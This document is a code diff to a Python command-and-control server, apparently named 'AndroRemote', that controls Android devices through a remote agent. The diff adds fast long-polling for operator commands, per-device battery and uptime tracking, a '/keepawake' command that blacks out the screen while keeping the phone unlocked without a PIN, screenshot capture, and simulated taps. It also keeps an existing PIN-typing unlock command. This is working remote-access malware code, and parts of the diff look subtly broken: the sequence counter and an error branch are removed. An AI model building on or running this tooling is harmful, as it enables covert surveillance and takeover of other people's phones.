@@ -110,6 +110,7 @@ ENC_PREFIX = "ENC1:"
 console = Console(highlight=False, soft_wrap=False)
 CLIENTS = {}  # id -> {model, last_seen, pending(deque), result, seq, last_cmd}
 LOCK = threading.Lock()
+PENDING_COND = threading.Condition(LOCK)  # wakes long-polling /b/ fetchers when a command queues
 ACTIVE = {"id": None}
 STARTED = time.time()
 PSK = None           # 32-byte AES-256 key or None
@@ -210,6 +211,16 @@ def cert_pin():
 
 # ────────────────────────────── C2 core ───────────────────────────────
 
+class QuietHTTPServer(ThreadingHTTPServer):
+    """Swallow client-disconnect noise (preconnect resets, dropped keep-alives)."""
+
+    def handle_error(self, request, client_address):
+        exc = sys.exc_info()[1]
+        if isinstance(exc, (ConnectionResetError, BrokenPipeError, TimeoutError)):
+            return
+        super().handle_error(request, client_address)
+
+
 class Handler(BaseHTTPRequestHandler):
     def log_message(self, *a):
         pass
@@ -238,14 +249,29 @@ class Handler(BaseHTTPRequestHandler):
             return self._send(404)
         cid = m.group(1)
         model = parse_qs(u.query).get("model", [""])[0]
+        sdk = parse_qs(u.query).get("sdk", [""])[0]
+        try:
+            batt = int(parse_qs(u.query).get("batt", ["-1"])[0])
+        except (TypeError, ValueError):
+            batt = -1
         client_ip = self.client_address[0] if self.client_address else "unknown"
-        with LOCK:
+        with PENDING_COND:
             c = CLIENTS.setdefault(
-                cid, {"model": "", "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
+                cid, {"model": "", "sdk": "", "batt": -1, "first_seen": 0, "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
             )
             fresh = c["seq"] == 0 and c["last_seen"] == 0
+            if fresh:
+                c["first_seen"] = time.time()
             c["last_seen"] = time.time()
             c["model"] = model or c["model"]
+            if sdk:
+                c["sdk"] = sdk
+            if batt >= 0:
+                c["batt"] = batt
+            # long-poll: hold the request until a command queues (or 25s)
+            # so operator input reaches the agent within milliseconds
+            if not c["pending"]:
+                PENDING_COND.wait(25)
             cmd = c["pending"].popleft() if c["pending"] else None
             if cmd:
                 c["last_cmd"] = cmd
@@ -282,11 +308,9 @@ class Handler(BaseHTTPRequestHandler):
             return self._send(400)
         with LOCK:
             c = CLIENTS.setdefault(
-                cid, {"model": "", "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
+                cid, {"model": "", "sdk": "", "batt": -1, "first_seen": 0, "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
             )
             c["result"] = result
-            c["enc"] = body.startswith(ENC_PREFIX)
-            c["seq"] += 1
             c["last_seen"] = time.time()
             last_cmd = c.get("last_cmd") or ""
             if last_cmd:
@@ -319,11 +343,12 @@ def b64s(s):
 
 
 def queue(cid, cmd):
-    with LOCK:
+    with PENDING_COND:
         c = CLIENTS.setdefault(
-            cid, {"model": "", "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
+            cid, {"model": "", "sdk": "", "batt": -1, "first_seen": 0, "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
         )
         c["pending"].append(cmd)
+        PENDING_COND.notify_all()  # wake any long-polling fetch for this cid
     if PLUGIN_MANAGER:
         PLUGIN_MANAGER.trigger_hook("on_command_queued", cid, cmd)
 
@@ -590,6 +615,9 @@ def print_sessions():
     t.add_column("#", width=2, style="dim", justify="right")
     t.add_column("ID / ALIAS", min_width=14, no_wrap=True, style="bold cyan")
     t.add_column("MODEL", max_width=18, no_wrap=True, style="white")
+    t.add_column("SDK", width=4, justify="center", style="dim")
+    t.add_column("BATT", width=4, justify="right", style="dim")
+    t.add_column("UPTIME", width=8, style="dim")
     t.add_column("STATUS", width=9)
     t.add_column("SEEN", min_width=6, style="dim", justify="right")
     t.add_column("PEND", width=4, justify="right")
@@ -598,11 +626,16 @@ def print_sessions():
     for i, (cid, c) in enumerate(items):
         mark = "[bold green]●[/bold green]" if cid == ACTIVE["id"] else " "
         st_style, st, age = status_of(c)
+        batt = c.get("batt", -1)
+        uptime = fmt_age(time.time() - c["first_seen"]) if c.get("first_seen") else "-"
         t.add_row(
             mark,
             str(i),
             alias_tag(cid),
             (c["model"] or "unknown")[:24],
+            c.get("sdk") or "-",
+            (f"{batt}%" if batt >= 0 else "-"),
+            uptime,
             Text(st, style=st_style),
             fmt_age(age),
             str(len(c["pending"])) if c["pending"] else "-",
@@ -1476,14 +1509,16 @@ COMMAND_INFO = {
              "Acquires a bright wake lock to turn the screen on (default 10s, max 300s).\nExample:\n  /wake\n  /wake 60"),
     "sleep": ("device", "/sleep", "Lock screen / turn display off",
               "Locks the keyguard and turns the screen off via the accessibility global action (requires axenable).\nAlias for /gaction lock."),
+    "keepawake": ("device", "/keepawake [secs] [plain]", "Keep awake: screen black, device unlocked",
+                  "Default (dark): brightness forced to 0 + bright wake lock — display never sleeps so the keyguard never engages (wake = instantly open, no PIN). Original brightness + auto-brightness are restored when the lock expires (default 300s, max 3600s). Device must be unlocked when issued. Token \"plain\" or no WRITE_SETTINGS access falls back to a partial wake lock (screen off per system timeout, keyguard per device policy). Opposite of /sleep.\nExample:\n  /keepawake\n  /keepawake 1800\n  /keepawake 600 plain"),
     "unlock": ("device", "/unlock <pin>", "Wake & dismiss PIN keyguard",
                "Wakes the screen, swipes up the lockscreen bouncer, types the PIN via accessibility and confirms. Needs accessibility service.\nBest-effort — OEM lockscreen implementations vary.\nExample:\n  /unlock 4821"),
     "vol": ("device", "/vol [level|up|down|mute]", "Get or adjust audio volume",
             "Queries or sets device audio volume.\nExample:\n  /vol up\n  /vol 10"),
-    "clipset": ("device", "/clipset <text>", "Set device clipboard text",
-                "Pushes text to Android clipboard."),
-    "clipget": ("device", "/clipget", "Read device clipboard text",
-                "Retrieves current string in Android clipboard."),
+    "screen": ("device", "/screen [out.jpg]", "Capture screenshot via projection",
+               "Takes a screenshot using Android MediaProjection service and downloads it.\nExample:\n  /screen device_screen.jpg"),
+    "tap": ("device", "/tap <x> <y>", "Simulate tap at screen coordinates",
+            "Simulates touch tap at (x, y) using accessibility service.\nExample:\n  /tap 540 960"),
     "torch": ("device", "/torch <on|off>", "Toggle camera flashlight",
               "Turns camera flash LED on or off.\nExample:\n  /torch on"),
     "vibrate": ("device", "/vibrate [ms]", "Trigger vibration (default 500ms)",
@@ -2051,7 +2086,7 @@ def dispatch(argv):
                 progress.advance(task, total_bytes)
             show_result(send_and_wait(payload) or "")
     elif op == "screen":
-        dest = rest[0] if rest else "screen.png"
+        dest = rest[0] if rest else "screen.jpg"
         download_b64(send_and_wait("SCREENB64") or "", dest)
     elif op == "rec":
         secs = rest[0] if rest else "10"
@@ -2086,6 +2121,8 @@ def dispatch(argv):
             show_result(send_and_wait("GACTION " + rest[0]) or "")
     elif op == "wake":
         show_result(send_and_wait("WAKE " + (rest[0] if rest else "")) or "")
+    elif op == "keepawake":
+        show_result(send_and_wait("KEEPAWAKE " + (rest[0] if rest else "")) or "")
     elif op == "sleep":
         show_result(send_and_wait("SLEEP") or "")
     elif op == "unlock":
@@ -2311,14 +2348,13 @@ def main(argv=None):
                   + (f"[green]https://0.0.0.0:{ARGS.port}[/green]  [dim](TLS)[/dim]"
                      if ARGS.tls else f"[green]http://0.0.0.0:{ARGS.port}[/green]"))
     try:
-        srv = ThreadingHTTPServer(("0.0.0.0", ARGS.port), Handler)
+        srv = QuietHTTPServer(("0.0.0.0", ARGS.port), Handler)
     except OSError as e:
         if e.errno == errno.EADDRINUSE:
             console.print(
                 f"  [red]error[/red]      C2 port {ARGS.port} is already in use. "
                 f"Stop the existing AndroRemote process or retry with [cyan]--port PORT[/cyan]."
             )
-        else:
             console.print(f"  [red]error[/red]      could not bind C2 listener: {e}")
         raise SystemExit(1) from e
     threading.Thread(target=srv.serve_forever, daemon=True).start()
